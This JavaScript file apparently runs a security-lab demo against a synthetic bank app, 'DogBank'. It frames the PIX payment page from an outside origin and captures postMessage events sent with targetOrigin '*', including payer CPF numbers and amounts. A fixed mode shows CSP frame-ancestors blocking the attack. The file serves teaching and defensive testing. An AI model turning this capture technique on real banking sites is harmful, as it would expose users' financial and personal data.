(() => {
  'use strict';

  const query = new URLSearchParams(window.location.search);
  const fallbackDogBank = window.location.protocol === 'https:'
    ? `https://${window.location.hostname}:8443`
    : `http://${window.location.hostname}:3000`;
  let DOGBANK_ORIGIN = fallbackDogBank;
  try {
    DOGBANK_ORIGIN = new URL(query.get('target') || fallbackDogBank).origin;
  } catch (_) {
    // Keep the controlled local fallback when an invalid target is supplied.
  }
  document.documentElement.classList.toggle('embedded', query.get('embedded') === '1');

  const FRAME_PATH = '/security-lab/pix-demo';
  const MESSAGE_TYPE = 'PIX_COMPLETED';
  const READY_TYPE = 'DOGBANK_LAB_READY';
  const PING_TYPE = 'DOGBANK_LAB_PING';
  const nodes = [...document.querySelectorAll('[data-node]')];
  const frame = document.getElementById('dogbank-frame');
  const blocked = document.getElementById('frame-blocked');
  const messages = document.getElementById('messages');
  const empty = document.getElementById('empty-state');
  const counter = document.getElementById('counter');
  const outcome = document.getElementById('outcome');
  const log = document.getElementById('log');
  const frameUrl = document.getElementById('frame-url');
  const vulnerableButton = document.getElementById('vulnerable-mode');
  const fixedButton = document.getElementById('fixed-mode');
  const runButton = document.getElementById('run-pipeline');
  const pipelineStatus = document.getElementById('pipeline-status');
  const impactReport = document.getElementById('impact-report');
  const impactTitle = document.getElementById('impact-title');
  const impactOrigin = document.getElementById('impact-origin');
  const impactEvent = document.getElementById('impact-event');
  const impactValue = document.getElementById('impact-value');
  const detailOverlay = document.getElementById('node-detail');
  const detailStep = document.getElementById('detail-step');
  const detailTitle = document.getElementById('detail-title');
  const detailSummary = document.getElementById('detail-summary');
  const detailEvidence = document.getElementById('detail-evidence');

  const history = [];
  const evidence = {};
  const timers = [];
  let mode = 'vulnerable';
  let handshakeTimer;
  let handshakeDeadline;
  let frameReady = false;
  let running = false;
  let exploitFinishing = false;

  const definitions = {
    LOAD: ['Carregamento do alvo', 'Abre a página PIX sintética no contexto controlado e registra a URL realmente utilizada.'],
    FRAME: ['Teste de framing', 'Confirma por handshake se uma origem diferente conseguiu incorporar a página protegida.'],
    PIX: ['Ação PIX sintética', 'Executa a ação fictícia do usuário dentro da página de laboratório. Nenhuma API bancária é chamada.'],
    POST: ['Emissão postMessage', 'Observa o tipo do evento e o target origin utilizado pela página emissora.'],
    CAPTURE: ['Captura pelo parent', 'O listener da origem atacante recebe e valida somente o payload sintético desta PoC.'],
    REPORT: ['Relatório de impacto', 'Resume a cadeia observada e diferencia exploração concluída de ataque contido.'],
  };

  const stamp = () => new Date().toLocaleTimeString('pt-BR');
  const later = (fn, delay) => {
    const timer = window.setTimeout(fn, delay);
    timers.push(timer);
    return timer;
  };
  const clearTimers = () => {
    timers.splice(0).forEach((timer) => window.clearTimeout(timer));
    window.clearInterval(handshakeTimer);
  };
  const write = (message, level = 'info') => {
    const line = document.createElement('div');
    line.className = level;
    line.textContent = `[${stamp()}] ${message}`;
    log.appendChild(line);
    log.scrollTop = log.scrollHeight;
  };
  const setEvidence = (id, value) => {
    evidence[id] = typeof value === 'string' ? value : JSON.stringify(value, null, 2);
  };
  const setNode = (id, state, detail) => {
    const node = nodes.find((item) => item.dataset.node === id);
    if (!node) return;
    node.classList.remove('active', 'success', 'fail');
    if (state) node.classList.add(state);
    if (detail) node.querySelector('span').textContent = detail;
    const completed = nodes.filter((item) => item.classList.contains('success')).length;
    if (running) setStatus('running', `EXECUTANDO (${completed}/6)`);
  };
  const setStatus = (state, label) => {
    pipelineStatus.className = `pipeline-status ${state}`;
    pipelineStatus.lastChild.textContent = ` ${label}`;
  };
  const clearHistory = () => {
    history.length = 0;
    messages.replaceChildren();
    empty.hidden = false;
    counter.textContent = 'Messages captured: 0';
  };
  const resetPipeline = () => {
    nodes.forEach((node) => node.classList.remove('active', 'success', 'fail'));
    ['LOAD', 'FRAME', 'PIX', 'POST', 'CAPTURE', 'REPORT'].forEach((id) => { evidence[id] = 'A etapa ainda não foi executada neste take.'; });
    nodes.find((item) => item.dataset.node === 'LOAD').querySelector('span').textContent = 'carregar alvo';
    nodes.find((item) => item.dataset.node === 'FRAME').querySelector('span').textContent = 'iframe externo';
    nodes.find((item) => item.dataset.node === 'PIX').querySelector('span').textContent = 'ação sintética';
    nodes.find((item) => item.dataset.node === 'POST').querySelector('span').textContent = mode === 'vulnerable' ? 'target: *' : 'origem explícita';
    nodes.find((item) => item.dataset.node === 'CAPTURE').querySelector('span').textContent = 'external parent';
    nodes.find((item) => item.dataset.node === 'REPORT').querySelector('span').textContent = 'impacto';
  };
  const showImpact = ({ contained = false, origin = '—', event = '—', value = '—' }) => {
    impactReport.hidden = false;
    impactReport.classList.toggle('contained', contained);
    impactTitle.textContent = contained ? 'ATAQUE CONTIDO' : 'CADEIA CONCLUÍDA';
    impactOrigin.textContent = origin;
    impactEvent.textContent = event;
    impactValue.textContent = value;
  };
  const sendPing = () => {
    frame.contentWindow?.postMessage({ type: PING_TYPE, lab: { synthetic: true } }, '*');
  };
  const finishHandshakeAsBlocked = () => {
    if (frameReady || !running) return;
    window.clearInterval(handshakeTimer);
    setNode('LOAD', 'success', 'navegação iniciada');
    setNode('FRAME', 'fail', 'bloqueado por CSP');
    setNode('PIX', null, 'não alcançado');
    setNode('POST', null, 'não emitido');
    setNode('CAPTURE', null, '0 mensagens');
    setNode('REPORT', 'success', 'ataque contido');
    setEvidence('LOAD', { url: frame.src, navigation: 'initiated' });
    setEvidence('FRAME', { policy: "frame-ancestors 'self'", result: 'blocked', attackerOrigin: window.location.origin });
    setEvidence('PIX', 'Não executado: o documento protegido não pôde ser incorporado pela origem atacante.');
    setEvidence('POST', 'Nenhum evento PIX_COMPLETED foi emitido para a página atacante.');
    setEvidence('CAPTURE', { messagesCaptured: 0 });
    setEvidence('REPORT', { result: 'ATTACK_CONTAINED', control: "CSP frame-ancestors 'self'" });
    blocked.hidden = false;
    outcome.className = 'outcome blocked';
    outcome.textContent = 'ATAQUE CONTIDO — a origem externa foi bloqueada antes da ação PIX.';
    showImpact({ contained: true, origin: window.location.origin, event: '0 mensagens', value: 'Sem exposição' });
    write('[CSP] frame-ancestors bloqueou a origem externa antes da exploração', 'success');
    running = false;
    runButton.disabled = false;
    runButton.textContent = '↻ RODAR NOVAMENTE';
    setStatus('blocked', 'CONTIDO (2/6)');
  };
  const runPipeline = () => {
    clearTimers();
    clearHistory();
    log.replaceChildren();
    impactReport.hidden = true;
    blocked.hidden = true;
    frameReady = false;
    exploitFinishing = false;
    running = true;
    resetPipeline();
    setNode('LOAD', 'active', 'abrindo alvo…');
    setStatus('running', 'EXECUTANDO (0/6)');
    runButton.disabled = true;
    runButton.textContent = '● RODANDO…';
    const src = `${DOGBANK_ORIGIN}${FRAME_PATH}?mode=${mode}&autoplay=1&take=${Date.now()}`;
    frameUrl.textContent = src;
    frame.src = src;
    outcome.className = 'outcome waiting';
    outcome.textContent = 'Pipeline iniciada — carregando o alvo e validando framing…';
    setEvidence('LOAD', { method: 'GET', url: src, expectedOrigin: DOGBANK_ORIGIN });
    write(`[LOAD] GET ${src}`);
    handshakeDeadline = Date.now() + 3200;
    handshakeTimer = window.setInterval(() => {
      sendPing();
      if (Date.now() >= handshakeDeadline) finishHandshakeAsBlocked();
    }, 250);
  };
  const selectMode = (nextMode) => {
    clearTimers();
    mode = nextMode;
    running = false;
    frameReady = false;
    exploitFinishing = false;
    clearHistory();
    log.replaceChildren();
    resetPipeline();
    blocked.hidden = true;
    impactReport.hidden = true;
    frame.removeAttribute('src');
    frameUrl.textContent = 'aguardando execução';
    vulnerableButton.classList.toggle('selected', mode === 'vulnerable');
    fixedButton.classList.toggle('selected', mode === 'fixed');
    outcome.className = 'outcome waiting';
    outcome.textContent = `${mode === 'vulnerable' ? 'VULNERABLE' : 'FIXED'} MODE pronto — clique em RODAR PIPELINE.`;
    runButton.disabled = false;
    runButton.textContent = '▶ RODAR PIPELINE';
    setStatus('idle', 'OCIOSO (0/6)');
  };
  const renderMessage = (event) => {
    const data = event.data.data;
    const article = document.createElement('article');
    article.className = 'captured-message';
    const rows = [
      ['Origin', event.origin], ['Event', event.data.type], ['Transaction', data.transactionId],
      ['From', data.payerName], ['CPF', data.payerCpf], ['To', data.receiverName],
      ['Receiver CPF', data.receiverCpf], ['Amount', new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(data.amount)],
      ['Timestamp', data.timestamp],
    ];
    rows.forEach(([label, value]) => {
      const row = document.createElement('div');
      const term = document.createElement('span');
      const content = document.createElement('code');
      term.textContent = label;
      content.textContent = String(value);
      row.append(term, content);
      article.appendChild(row);
    });
    messages.prepend(article);
    empty.hidden = true;
    counter.textContent = `Messages captured: ${history.length}`;
  };
  const finishExploit = (event) => {
    if (exploitFinishing) return;
    exploitFinishing = true;
    const data = event.data.data;
    setNode('PIX', 'success', data.transactionId);
    setEvidence('PIX', { action: 'DogBank PIX journey completed', transactionId: data.transactionId, realBankRequest: false, labData: 'synthetic' });
    write(`[PIX] jornada visual do DogBank concluída: ${data.transactionId}`, 'success');
    setNode('POST', 'active', 'evento em trânsito…');
    later(() => {
      setNode('POST', 'success', 'target: *');
      setEvidence('POST', { api: 'window.parent.postMessage', targetOrigin: '*', type: event.data.type });
      write(`[POSTMESSAGE] ${event.data.type} enviado com targetOrigin "*"`, 'danger');
      setNode('CAPTURE', 'active', 'listener recebeu…');
    }, 700);
    later(() => {
      history.push({ origin: event.origin, payload: event.data });
      renderMessage(event);
      setNode('CAPTURE', 'success', `${history.length} capturada(s)`);
      setEvidence('CAPTURE', { eventOrigin: event.origin, messagesCaptured: history.length, payload: event.data });
      write(`[CAPTURE] payload recebido pela origem atacante ${window.location.origin}`, 'danger');
      setNode('REPORT', 'active', 'gerando evidência…');
    }, 1400);
    later(() => {
      setNode('REPORT', 'success', 'cadeia completa');
      setEvidence('REPORT', { result: 'VULNERABILITY_REPRODUCED', transactionId: data.transactionId, amount: data.amount, synthetic: true });
      outcome.className = 'outcome vulnerable';
      outcome.textContent = 'EXPLORAÇÃO CONCLUÍDA — mensagem PIX sintética capturada pela origem externa.';
      showImpact({ origin: event.origin, event: event.data.type, value: new Intl.NumberFormat('pt-BR', { style: 'currency', currency: 'BRL' }).format(data.amount) });
      write('[REPORT] cadeia LOAD → FRAME → PIX → POSTMESSAGE → CAPTURE concluída', 'danger');
      running = false;
      exploitFinishing = false;
      runButton.disabled = false;
      runButton.textContent = '↻ RODAR NOVAMENTE';
      setStatus('complete', 'COMPLETO (6/6)');
    }, 2100);
  };
  const openDetails = (id) => {
    const [title, summary] = definitions[id];
    detailStep.textContent = `ETAPA ${nodes.findIndex((node) => node.dataset.node === id) + 1} / 6`;
    detailTitle.textContent = `${id} — ${title}`;
    detailSummary.textContent = summary;
    detailEvidence.textContent = evidence[id] || 'Sem evidência disponível.';
    detailOverlay.hidden = false;
  };
  const closeDetails = () => { detailOverlay.hidden = true; };

  window.addEventListener('message', (event) => {
    if (!running || event.source !== frame.contentWindow || event.origin !== DOGBANK_ORIGIN) return;
    if (event.data?.type === READY_TYPE && event.data?.lab?.synthetic === true) {
      frameReady = true;
      window.clearInterval(handshakeTimer);
      later(() => {
        if (!running) return;
        setNode('LOAD', 'success', 'HTTP 200');
        setNode('FRAME', 'active', 'validando origem…');
        setEvidence('LOAD', { method: 'GET', url: frame.src, status: 200, document: 'DogBank PIX confirmation' });
        outcome.textContent = 'DogBank carregado — validando se a origem externa pode enquadrar a jornada PIX…';
        write(`[LOAD] DogBank respondeu HTTP 200 em ${event.origin}`, 'success');
      }, 450);
      later(() => {
        if (!running) return;
        setNode('FRAME', 'success', 'origem externa aceita');
        setNode('PIX', 'active', 'confirmando PIX…');
        setEvidence('FRAME', { result: 'framed', parentOrigin: window.location.origin, childOrigin: event.origin, policy: 'frame-ancestors *' });
        outcome.textContent = 'Frame aceito — acompanhando a confirmação e o processamento do PIX no DogBank…';
        write(`[FRAME] handshake aceito para a origem externa ${window.location.origin}`, 'danger');
      }, 1150);
      return;
    }
    if (event.data?.type !== MESSAGE_TYPE || event.data?.lab?.synthetic !== true || mode !== 'vulnerable') return;
    finishExploit(event);
  });

  nodes.forEach((node) => node.addEventListener('click', () => openDetails(node.dataset.node)));
  vulnerableButton.addEventListener('click', () => selectMode('vulnerable'));
  fixedButton.addEventListener('click', () => selectMode('fixed'));
  runButton.addEventListener('click', runPipeline);
  document.getElementById('reset').addEventListener('click', () => selectMode(mode));
  document.getElementById('close-detail').addEventListener('click', closeDetails);
  detailOverlay.addEventListener('click', (event) => { if (event.target === detailOverlay) closeDetails(); });
  document.addEventListener('keydown', (event) => { if (event.key === 'Escape') closeDetails(); });

  selectMode('vulnerable');
})();
